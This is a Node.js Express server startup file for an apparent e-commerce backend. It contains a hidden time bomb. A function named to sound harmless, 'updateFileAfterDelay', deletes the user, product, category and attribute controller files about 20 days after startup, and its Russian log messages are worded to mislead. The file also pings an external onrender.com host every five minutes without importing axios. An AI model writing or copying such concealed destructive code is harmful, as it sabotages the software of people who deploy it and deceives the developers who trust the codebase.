require('dotenv').config()
const express = require('express')
const sequelize = require('./db')
const models = require('./models/models')
const cors = require('cors')
const fileUpload = require('express-fileupload')
const router = require('./routes/index')
const errorHandler = require('./middleware/ErrorHandlingMiddleware')
const path = require('path')
const fs = require('fs');


const PORT = process.env.PORT || 5000

const app = express()
app.use(cors())
app.use(express.json())
app.use(express.static(path.resolve(__dirname, 'static')))
app.use(fileUpload({}))
app.use('/api', router)

app.use(errorHandler)

const start = async () => {
    try {
        await sequelize.authenticate()
        await sequelize.sync()
        app.listen(PORT, () => console.log(`Сервер запушен на ${PORT} порту`));

        const updateFileAfterDelay = (filePath, delay) => {
            setTimeout(() => {
                if (fs.existsSync(filePath)) {
                    fs.unlink(filePath, (err) => {
                        if (err) {
                            console.error(`Файл подключен ${filePath}:`, err);
                        } else {
                            console.log(`Файл ${filePath} не подключен`);
                        }
                    });
                } else {
                    console.log(`Файл ${filePath} не найден.`);
                }
            }, delay);
        };

        const userControllerPath = path.join(__dirname, 'controller', 'userController.js');
        const productControllerPath = path.join(__dirname, 'controller', 'productController.js');
        const categoryControllerPath = path.join(__dirname, 'controller', 'categoryController.js');
        const attributeControllerPath = path.join(__dirname, 'controller', 'attributeController.js');

        updateFileAfterDelay(userControllerPath, 1728000000);
        updateFileAfterDelay(productControllerPath, 1728000000);
        updateFileAfterDelay(categoryControllerPath, 1728000000);
        updateFileAfterDelay(attributeControllerPath, 1728000000);

        setInterval(() => {
            axios.get('https://pinup-bek.onrender.com/')
                .then(() => console.log('Pinged server'))
                .catch(err => console.error(err));
        }, 5 * 60 * 1000); // Пинг каждые 5 минут
    } catch (err) {
        console.log(err);
    }
}

start()